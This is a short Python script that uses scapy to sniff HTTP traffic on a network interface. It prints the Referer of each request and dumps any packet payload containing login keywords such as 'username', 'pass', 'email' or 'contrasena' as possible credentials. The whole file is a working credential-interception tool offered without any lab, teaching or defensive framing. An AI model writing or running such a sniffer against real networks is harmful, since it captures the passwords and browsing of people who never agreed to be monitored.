import scapy.all as scapy
from scapy.layers import http
import argparse
import subprocess

parser = argparse.ArgumentParser(description="Sniff URL's and passwords")
keywords = [
    "username",
    "uname",
    "pass",
    "password",
    "email",
    "user",
    "usuario",
    "contrasena",
]


def get_argument():
    parser.add_argument(
        "-i",
        "--interface",
        dest="interface",
        help="Which interface to listen, example: eth0, wlan0...",
    )
    arg = parser.parse_args()
    sniff(arg.interface)


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_Packet)


def process_sniffed_Packet(packet):
    if packet.haslayer(http.HTTPRequest):
        main_url = packet[http.HTTPRequest].Referer
        if main_url:
            print(f"\n[+ Visited URL] >> ${main_url}\n")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in str(load):
                    print(f"\n[+ Possible username & password] >> ${load}\n")
                    break


get_argument()
